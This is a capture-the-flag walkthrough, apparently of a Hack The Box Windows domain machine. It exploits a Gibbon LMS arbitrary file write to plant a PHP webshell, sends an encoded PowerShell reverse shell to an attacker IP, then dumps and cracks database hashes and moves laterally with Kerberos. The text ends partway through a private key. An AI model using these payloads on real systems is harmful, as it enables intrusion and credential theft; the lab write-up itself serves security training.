### Summary
We start the box with a webserver running a vulnerable version of `Gibbson LMS`, allowing us an arbitrary write which we leverage into a `PHP` webshell. From there, we find database credentials and leak the hash of `f.frizzle` which we can crack. Then, after some `kinit` shenanigans, we're able to `SSH` into the box as `f.frizzle`. From here we find a recycled directory which stores credentials that we discern belong to `m.schoolbus`. Once we `SSH` in as `m.schoolbus`, we notice that they belong to the `Group Policy Creator Owners` group, allowing them to write new `Group Policy Objects` (GPOs) which define scripts that can be run as root in an Active Directory environment. We utilize `SharpGPOAbuse` to call a reverse shell and get root!

### Tools
- `nxc`
- `rlwrap`
- `mysql`
- `hashcat`
- `kinit` - get a ticket from a `krb5.conf` file in `/etc/` for `SSH` auth
- `SharpGPOAbuse`

###### [[#Recon]]
- [[#Initial Scan]]
	- [[#nxc host file generation]]
- [[#HTTP - TCP 80]]
- [[#SMB - TCP 445]]
###### [[#User Shell - w.webservice]]
- [[#HTTP Arbitrary File Upload]]
	- [[#rlwrap]]
- [[#Enumeration]]
	- [[#Database]]
		- [[#Powershell Binary Help Menu]]
###### [[#User Auth - f.frizzle]]
- [[#Cracking Hash]]
- [[#SMB - TCP 445 Take 2]]
###### [[#User Shell - f.frizzle]]
- [[#SSH - TCP 22]]
- [[#Enumeration]]
- [[#WAPT]]
###### [[#User Shell - M.SchoolBus]]
- [[#SSH - M.SchoolBus]]
- [[#Enumeration]]
- [[#GPO]]
- [[#SharpGPOAbuse]]
###### [[#Root Shell]]
- [[#SharpGPOAbuse Reverse Shell]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.14.231 -oN nmap/tcp             
PORT      STATE SERVICE          REASON
22/tcp    open  ssh              syn-ack ttl 127
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
49670/tcp open  unknown          syn-ack ttl 127
52259/tcp open  unknown          syn-ack ttl 127
```
```sh
❯ sudo nmap -p 22,53,80,88,135,139,389,445,593,636,3268,3269,9389,49664,49668,49670,52259 -sCV -vv 10.129.14.231 -oN nmap/tcpScripts
PORT      STATE SERVICE       REASON          VERSION
22/tcp    open  ssh           syn-ack ttl 127 OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-02-07 04:46:02Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
52259/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-02-07T04:46:53
|_  start_date: N/A
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 61968/tcp): CLEAN (Timeout)
|   Check 2 (port 4061/tcp): CLEAN (Timeout)
|   Check 3 (port 34642/udp): CLEAN (Timeout)
|   Check 4 (port 56085/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: 6h59m58s
```
- The TTL corresponds with a Windows system
- A lot of these ports show we're working with an Active Directory system
- Hostname is `FRIZZDC`

### nxc host file generation
```sh
❯ nxc smb 10.129.14.231 --generate-hosts-file hosts                           
SMB         10.129.14.231   445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:None) (NTLM:False)
❯ cat hosts /etc/hosts | sudo sponge /etc/hosts
```

## HTTP - TCP 80
---
- Navigating to the site shows Walker Elementary School where we get a dynamic site with hyperlink-less links
- The response headers give us `Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12`
- There is a login page that redirects us to Gibbon LMS
	- Attempting an incorrect login gives a message, `Incorrect username & password`
	- I tried `admin` and `root` as the username but the error was the same, likely not leaking information to us

- We can try to run `feroxbuster` including `php` extensions but it doesn't show anything that we don't already know about

## SMB - TCP 445
---
```sh
❯ nxc smb 10.129.14.231 -u '' -p ''                             
SMB         10.129.14.231   445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.14.231   445    frizzdc          [-] frizz.htb\: STATUS_NOT_SUPPORTED 

❯ nxc smb 10.129.14.231 -u 'guest' -p ''
SMB         10.129.14.231   445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.14.231   445    frizzdc          [-] frizz.htb\guest: STATUS_NOT_SUPPORTED 
```
- We're unable to get `SMB` access with blank or guest credentials
- We'll need creds to continue here

# User Shell - w.webservice
## HTTP Arbitrary File Upload
---
- A quick lookup online for `Gibbon LMS v25` exploits quickly brings us to an unauthenticated RCE vulnerability on [github](https://github.com/Can0I0Ever0Enter/CVE-2023-45878)
- There exists an endpoint `rubrics_visualise_saveAjax.php` that allows unauthenticated, arbitrary file writes

- We can navigate to the vulnerable endpoint:
	- http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php
- There are three POST parameters that are important for this exploit:
	- `img` - the image to upload (our PHP webshell)
		- `image/png;exploit,[b64]`
	- `path` - the path of the upload image
	- `gibbonPersonID` - required ID, can set to 1

- We can grab some dummy data and base64 encode it:
```sh
❯ echo "ruh roh raggy" | base64
cnVoIHJvaCByYWdneQo=
```

- Now we can try to `curl` to see if we've got file upload:
```sh
❯ curl "http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php" -d 'img=image/png;test,cnVoIHJvaCByYWdneQo=&path=test.png&gibbonPersonID=1'
test.png

❯ curl "http://frizzdc.frizz.htb/Gibbon-LMS/test.png"
ruh roh raggy
```
- It works! Now we've just gotta upload a php webshell

```sh
❯ ccat shell.php                
<?php system($_GET['cmd']); ?>

❯ cat shell.php | base64
PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+Cg==

❯ curl "http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php" -d 'img=image/png;shell,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+Cg==&path=shell.php&gibbonPersonID=1'
shell.php

❯ curl "http://frizzdc.frizz.htb/Gibbon-LMS/shell.php?cmd=whoami"
frizz\w.webservice
```
- We've got command execution!

- We can grab a Powershell b64 payload from [revshells](https://www.revshells.com/) and URL encode it:
```sh
❯ curl "http://frizzdc.frizz.htb/Gibbon-LMS/shell.php?cmd=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQA2ADEAIgAsADEAMgAzADQANQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA%2BACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA%2BACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA%3D"
```

### rlwrap
- We can use `rlwrap` for a better feeling windows shell via our `netcat` listener:
```sh
❯ sudo rlwrap -cAr nc -lvnp 12345
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.14.231.
Ncat: Connection from 10.129.14.231:53260.
```

## Enumeration
---
- We can take a peek at the `config.php` file:
```php
<?php
/*
Gibbon, Flexible & Open School System
Copyright (C) 2010, Ross Parker

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

/**
 * Sets the database connection information.
 * You can supply an optional $databasePort if your server requires one.
 */
$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';

/**
 * Sets a globally unique id, to allow multiple installs on a single server.
 */
$guid = '7y59n5xz-uym-ei9p-7mmq-83vifmtyey2';

/**
 * Sets system-wide caching factor, used to balance performance and freshness.
 * Value represents number of page loads between cache refresh.
 * Must be positive integer. 1 means no caching.
 */
$caching = 10;
```
- We can pocket the `MisterGibbs!Parrot!?1` credential for later

### Database
- If we navigate to the parent directory a few times, we see a `mysql` directory:
```powershell
PS C:\xampp> ls

    Directory: C:\xampp
    
Mode                 LastWriteTime         Length Name                           
----                 -------------         ------ ----                          
d-----        10/29/2024   7:25 AM                apache                        
d-----        10/29/2024   7:26 AM                cgi-bin                       
d-----        10/29/2024   7:25 AM                contrib                       
d-----        10/29/2024   7:28 AM                htdocs                        
d-----        10/29/2024   7:25 AM                licenses                      
d-----        10/29/2024   7:25 AM                mysql                         
d-----        10/29/2024   7:26 AM                php                           
d-----        10/29/2024   7:25 AM                src                           
d-----          2/6/2026  10:10 PM                tmp
```
- Further in this directory is the `mysql.exe` executable

#### Powershell Binary Help Menu
- We can get execution information through the following Powershell command:
```sh
PS C:\xampp\mysql\bin> cmd /c mysql.exe -?
mysql.exe  Ver 15.1 Distrib 10.4.32-MariaDB, for Win64 (AMD64), source revision c4143f909528e3fab0677a28631d10389354c491
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Usage: mysql.exe [OPTIONS] [database]
...
```
- We need the following flags:
	- `-u` - username
	- `-p` - password
- The way to input the flags and their values is very particular and annoying af but it goes like the following:
```sh
PS C:\xampp\htdocs\Gibbon-LMS> ../../mysql/bin/mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "SHOW DATABASES;"
Database
gibbon
information_schema
test
```

```powershell
PS C:\xampp\htdocs\Gibbon-LMS> ../../mysql/bin/mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" test -e "SHOW TABLES;"
```
- The `test` database has no tables

```powershell
PS C:\xampp\htdocs\Gibbon-LMS> ../../mysql/bin/mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" gibbon -e "SHOW TABLES;"
Tables_in_gibbon
gibbonaction
gibbonactivity
gibbonactivityattendance
gibbonactivityslot
gibbonactivitystaff
gibbonactivitystudent
gibbonactivitytype
gibbonadmissionsaccount
gibbonadmissionsapplication
gibbonalarm
gibbonalarmconfirm
...
```
- The `gibbon` database has a fuckton
- An interesting table is `gibbonperson`:
```powershell
PS C:\xampp\htdocs\Gibbon-LMS> ../../mysql/bin/mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" gibbon -e "DESCRIBE gibbonperson;"
...
passwordStrong  varchar(255)    NO              NULL
passwordStrongSalt      varchar(255)    NO              NULL
...
```
```powershell
PS C:\xampp\htdocs\Gibbon-LMS> ../../mysql/bin/mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" gibbon -e "SELECT username,passwordStrong,passwordStrongSalt From gibbonperson;"
username        passwordStrong  passwordStrongSalt
f.frizzle       067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03        /aACFhikmNopqrRTVz2489
```

- We can navigate to the [GibbonLMS github repo](https://github.com/GibbonEdu/core/blob/v31.0.00/preferencesPasswordProcess.php) and see how the password is configured:
```php
...
//Check current password
if (hash('sha256', $user['passwordStrongSalt'].$password) != $user['passwordStrong']) {
	header("Location: {$URL->withReturn('error3')}");
	exit;
} else {
	//If answer insert fails...
	$salt = getSalt();
	$passwordStrong = hash('sha256', $salt.$passwordNew);
...
```
- Looks like `passwordStrong` is `sha256(Salt + Password)`

# User Auth - f.frizzle
## Cracking Hash
---
- `hashcat` can take salted SHA256 in the form of `hash:salt`, so we can quickly store that format to a file:
```sh
067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489
```

- Then we can sauce it over to `hashcat` which gives us 13 format options:
```sh
   1410 | sha256($pass.$salt)                          | Raw Hash salted and/or iterated
   1420 | sha256($salt.$pass)                          | Raw Hash salted and/or iterated
  22300 | sha256($salt.$pass.$salt)                    | Raw Hash salted and/or iterated
  20720 | sha256($salt.sha256($pass))                  | Raw Hash salted and/or iterated
  21420 | sha256($salt.sha256_bin($pass))              | Raw Hash salted and/or iterated
   1440 | sha256($salt.utf16le($pass))                 | Raw Hash salted and/or iterated
  20710 | sha256(sha256($pass).$salt)                  | Raw Hash salted and/or iterated
   1430 | sha256(utf16le($pass).$salt)                 | Raw Hash salted and/or iterated
   1450 | HMAC-SHA256 (key = $pass)                    | Raw Hash authenticated
   1460 | HMAC-SHA256 (key = $salt)                    | Raw Hash authenticated
  11750 | HMAC-Streebog-256 (key = $pass), big-endian  | Raw Hash authenticated
  11760 | HMAC-Streebog-256 (key = $salt), big-endian  | Raw Hash authenticated
  20712 | RSA Security Analytics / NetWitness (sha256) | Enterprise Application Software (EAS)
```
- Since we were able to inspect the source code and determine the password is stored as `sha256(Salt + Password)`, we'll choose option `1420`

```sh
❯ hashcat -m 1420 hash ~/ctf/TOOLS/wordlist/rockyou.txt 
...
067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:Jenni_Luvs_Magic23
...
```
- It quickly reveals the password `Jenni_Luvs_Magic23`

- We can verify authentication with `nxc`:
```sh
❯ nxc smb 10.129.14.231 -u f.frizzle -p Jenni_Luvs_Magic23
SMB         10.129.14.231   445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.14.231   445    frizzdc          [-] frizz.htb\f.frizzle:Jenni_Luvs_Magic23 STATUS_NOT_SUPPORTED
```
- It fails?
- We can get more information with `-k` since we know we're playing with a kerberos box:
```sh
❯ nxc smb 10.129.14.231 -u f.frizzle -p Jenni_Luvs_Magic23 -k
SMB         10.129.14.231   445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.14.231   445    frizzdc          [-] frizz.htb\f.frizzle:Jenni_Luvs_Magic23 KRB_AP_ERR_SKEW 
```
- Looks like clock skew is fucking us. We can fix that with `ntpdate`
```sh
❯ sudo ntpdate 10.129.14.231
{"time":"2026-02-07T01:52:55.495358-0500","offset":25199.407317,"precision":0.008797,"host":"10.129.14.231","ip":"10.129.14.231","stratum":1,"leap":"no-leap","adjusted":true,"delay":0.017593}
CLOCK: time stepped by 25199.407317
```
- Now we can try `nxc` verification again:
```sh
❯ nxc smb 10.129.14.231 -u f.frizzle -p Jenni_Luvs_Magic23 -k
SMB         10.129.14.231   445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.14.231   445    frizzdc          [+] frizz.htb\f.frizzle:Jenni_Luvs_Magic23
```

## SMB - TCP 445 Take 2
---
- We can inspect the shares now that we're authenticated:
```sh
❯ nxc smb 10.129.14.231 -u f.frizzle -p Jenni_Luvs_Magic23 -k --shares
Share           Permissions     Remark              
-----           -----------     ------              
ADMIN$                          Remote Admin        
C$                              Default share       
IPC$            READ            Remote IPC          
NETLOGON        READ            Logon server share  
SYSVOL          READ            Logon server share  
```
- Looks like just the default shares here

```sh
❯ nxc smb 10.129.14.231 -u f.frizzle -p Jenni_Luvs_Magic23 -k --users 
-Username-                    -Last PW Set-       -BadPW- -Description-                                                
Administrator                 2025-02-25 21:24:10 0       Built-in account for administering the computer/domain       
Guest                         <never>             0       Built-in account for guest access to the computer/domain     
krbtgt                        2024-10-29 14:19:54 0       Key Distribution Center Service Account                      
f.frizzle                     2024-10-29 14:27:03 0       Wizard in Training     
w.li                          2024-10-29 14:27:03 0       Student                
h.arm                         2024-10-29 14:27:03 0       Student                
M.SchoolBus                   2024-10-29 14:27:03 0       Desktop Administrator  
d.hudson                      2024-10-29 14:27:03 0       Student                
k.franklin                    2024-10-29 14:27:03 0       Student                
l.awesome                     2024-10-29 14:27:03 0       Student                
t.wright                      2024-10-29 14:27:03 0       Student                
r.tennelli                    2024-10-29 14:27:04 0       Student                
J.perlstein                   2024-10-29 14:27:04 0       Student                
a.perlstein                   2024-10-29 14:27:04 0       Student                
p.terese                      2024-10-29 14:27:04 0       Student                
v.frizzle                     2024-10-29 14:27:04 0       The Wizard             
g.frizzle                     2024-10-29 14:27:04 0       Student                
c.sandiego                    2024-10-29 14:27:04 0       Student                
c.ramon                       2024-10-29 14:27:04 0       Student                
m.ramon                       2024-10-29 14:27:04 0       Student                
w.Webservice                  2024-10-29 14:27:04 0       Service for the website                                      
```
- Looks like we've got quite a few non-default users on the box

# User Shell - f.frizzle
## SSH - TCP 22
---
- Attempting to connect via `SSH` gives us an error:
```sh
❯ ssh f.frizzle@10.129.14.231                                     
f.frizzle@10.129.14.231: Permission denied (gssapi-with-mic,keyboard-interactive).
```

- We can circumvent this error by generating a kerberos authentication (krb5) file with `nxc`:
```sh
❯ nxc smb 10.129.14.231 -u f.frizzle -p Jenni_Luvs_Magic23 -k --generate-krb5-file krb5.conf
SMB         10.129.14.231   445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.14.231   445    frizzdc          [+] krb5 conf saved to: krb5.conf
SMB         10.129.14.231   445    frizzdc          [+] Run the following command to use the conf file: export KRB5_CONFIG=krb5.conf
SMB         10.129.14.231   445    frizzdc          [+] frizz.htb\f.frizzle:Jenni_Luvs_Magic23 

❯ ccat krb5.conf       
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = FRIZZ.HTB

[realms]
    FRIZZ.HTB = {
        kdc = frizzdc.frizz.htb
        admin_server = frizzdc.frizz.htb
        default_domain = frizz.htb
    }

[domain_realm]
    .frizz.htb = FRIZZ.HTB
    frizz.htb = FRIZZ.HTB
```

- We'll wanna copy the `krb5.conf` file into `/etc/` and then run `kinit` to get a ticket as `f.frizzle`:
```sh
❯ kinit f.frizzle
Password for f.frizzle@FRIZZ.HTB: 

❯ klist          
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: f.frizzle@FRIZZ.HTB

Valid starting       Expires              Service principal
02/07/2026 02:10:07  02/07/2026 12:10:07  krbtgt/FRIZZ.HTB@FRIZZ.HTB
        renew until 02/08/2026 02:09:56
```

- Now we can connect via `ssh -k`, telling `SSH` to use kerberos authentication
```sh
❯ ssh -k f.frizzle@10.129.14.231
PowerShell 7.4.5
PS C:\Users\f.frizzle>
```

## Enumeration
---
- We can now grab the user.txt file!
```powershell
PS C:\Users\f.frizzle\Desktop> cat .\user.txt
49fd1c9cc9e7334d41ca63e43f37d4d2
```

- There's nothing else interesting in `f.frizzle`'s home directory
- There's a weird, hidden file in the root directory but we can't access it:
```powershell
PS C:\> ls -force

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hs          10/29/2024  7:31 AM                $RECYCLE.BIN
d--h-           3/10/2025  3:31 PM                $WinREAgent
d--hs           7/24/2025 12:41 PM                Config.Msi
l--hs          10/29/2024  9:12 AM                Documents and Settings -> C:\Users
d----           3/10/2025  3:39 PM                inetpub
d----            5/8/2021  1:15 AM                PerfLogs
d-r--           7/24/2025 12:41 PM                Program Files
d----            5/8/2021  2:34 AM                Program Files (x86)
d--h-           2/20/2025  2:50 PM                ProgramData
d--hs          10/29/2024  9:12 AM                Recovery
d--hs          10/29/2024  7:25 AM                System Volume Information
d-r--          10/29/2024  7:31 AM                Users
d----           3/10/2025  3:41 PM                Windows
d----          10/29/2024  7:28 AM                xampp
-a-hs          10/29/2024  8:27 AM          12288 DumpStack.log.tmp

PS C:\> type .\DumpStack.log.tmp
Get-Content: Access to the path 'C:\DumpStack.log.tmp' is denied.
```

- We can inspect the installed files but there's not really anything that pops out:
```powershell
PS C:\> ls '.\Program Files\'

    Directory: C:\Program Files

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d----           2/20/2025  2:50 PM                Common Files
d----            5/8/2021  1:15 AM                Internet Explorer
d----            5/8/2021  1:15 AM                ModifiableWindowsApps
d----           2/26/2025  8:13 AM                PackageManagement
d----          10/29/2024  7:15 AM                PowerShell
d----           7/24/2025 12:41 PM                VMware
d----           2/26/2025  8:18 AM                Windows Defender
d----           3/10/2025  3:39 PM                Windows Defender Advanced Threat Protection
d----            5/8/2021  2:34 AM                Windows NT
d----           2/26/2025  8:13 AM                WindowsPowerShell

PS C:\> ls '.\Program Files (x86)\'

    Directory: C:\Program Files (x86)

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d----            5/8/2021  1:27 AM                Common Files
d----            5/8/2021  1:15 AM                Internet Explorer
d----            5/8/2021  1:27 AM                Microsoft.NET
d----            5/8/2021  2:33 AM                Windows Defender
d----            5/8/2021  2:34 AM                Windows NT
d----            5/8/2021  1:15 AM                WindowsPowerShell
```

- There's a single hidden directory in the `$RECYCLE_BIN` directory:
```powershell
PS C:\> ls -force '.\$RECYCLE.BIN\'

    Directory: C:\$RECYCLE.BIN

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hs          10/29/2024  7:31 AM                S-1-5-21-2386970044-1145388522-2932701813-1103

PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> ls -force

    Directory: C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---          10/29/2024  7:31 AM            148 $IE2XMEG.7z
-a---          10/24/2024  9:16 PM       30416987 $RE2XMEG.7z
-a-hs          10/29/2024  7:31 AM            129 desktop.ini
```
- Looks like 2 `7z` archives. We can grab them to our linux box with `scp`:
```sh
❯ scp f.frizzle@10.129.14.231:'C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$IE2XMEG.7z' .
$IE2XMEG.7z                                                          100%  148     5.3KB/s   00:00    
```

- The `$IE2XMEG.7z` file isn't an archive but the metadata for the `$RE2XMEG.7z` file
```sh
❯ file \$IE2XMEG.7z 
$IE2XMEG.7z: data
❯ xxd \$IE2XMEG.7z 
00000000: 0200 0000 0000 0000 5b20 d001 0000 0000  ........[ ......
00000010: 0016 9732 0f2a db01 3c00 0000 4300 3a00  ...2.*..<...C.:.
00000020: 5c00 5500 7300 6500 7200 7300 5c00 6600  \.U.s.e.r.s.\.f.
00000030: 2e00 6600 7200 6900 7a00 7a00 6c00 6500  ..f.r.i.z.z.l.e.
00000040: 5c00 4100 7000 7000 4400 6100 7400 6100  \.A.p.p.D.a.t.a.
00000050: 5c00 4c00 6f00 6300 6100 6c00 5c00 5400  \.L.o.c.a.l.\.T.
00000060: 6500 6d00 7000 5c00 7700 6100 7000 7400  e.m.p.\.w.a.p.t.
00000070: 2d00 6200 6100 6300 6b00 7500 7000 2d00  -.b.a.c.k.u.p.-.
00000080: 7300 7500 6e00 6400 6100 7900 2e00 3700  s.u.n.d.a.y...7.
00000090: 7a00 0000                                z...
```
- Looks like it was stored in `C:\Users\f.frizzle\AppData\Local\Temp\wapt-backup-sunday.7z`

## WAPT
---
- `WAPT` is a set of system utilities to help administrators efficiently deploy, setup, update, and configure applications
- There are some interesting files in the `conf` directory, looks like some `RSA` keys and credentials
```sh
❯ ccat ca-192.168.120.158.*
-----BEGIN CERTIFICATE-----
MIIDCjCCAfKgAwIBAgIUEdd0bIGox1LB+CfMxov0wxD3rzswDQYJKoZIhvcNAQEL
BQAwHTEbMBkGA1UEAwwSY2EtMTkyLjE2OC4xMjAuMTU4MB4XDTI0MTAyMzAzMzcw
MVoXDTM0MTAyMTAzMzcwMVowHTEbMBkGA1UEAwwSY2EtMTkyLjE2OC4xMjAuMTU4
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtrbsr3feDrFyBvHtqaql
qGlCE0yqF8A3OBZA1BkcKBzr+wvdkQoOX55hlKEMbNGAASD5gPD9rTTIofLFD7GF
hkS+2P7DbP5VVZFx65WFEsY+Wb9bbyPVcuKZC38VCjhABsZSAOwIna3lLwZDPnDF
83Wuna5ut30R8Jo0dCLLQ6SM/tS+gwQKrWqLozl1OTQzb+SsceUPRaRF+vJkc+LM
WRJ9DA4JbPBVBwZmPsS9c23lI/bSR70JPkCmK8qW7eswARqzYRy48ADPNyvF962g
MmCLbBG/OppbeaNmvvEj1dnPkgP8y3uZcK4pHXgtS5YYsYHlrEogyP7oaupISAFy
ZQIDAQABo0IwQDAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQWBBT26pzwy97MfD5V
Gg8rKQvZvgNfNjAOBgNVHQ8BAf8EBAMCAdYwDQYJKoZIhvcNAQELBQADggEBAAeA
Tu0u0hvHPFPrKBOOz0wxtes+OkZ/D/3bHMdOW8Ddo+R1zzQ0BtT2EU5p82wdiMW3
Wx1RfiQydWtSf/QFCiquxWryLd2HLShfYdVIbf6kUjSbnxrwkqz1KpJghgSuCi3U
kw+tzJfVgI4msd3Q6kUdvhK6dEhvRk9M+zphIm93hZtGLDy0yCGOSmPLH//QGDFl
WOj43NCKKZvqViHvjLHYiKayEh0413Zo/jqgZqb+X9xhjh5Nn3vBKrK8yPl3dXqU
dUxc8Y+cpnnKx9jpABQqXLJ5SIj9hXzWslXtKBxIVS/078qFlVInFC16ui+K0vaj
vibRtK+ZB3zclOhH2zA=
-----END CERTIFICATE-----
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAtrbsr3feDrFyBvHtqaqlqGlCE0yqF8A3OBZA1BkcKBzr+wvd
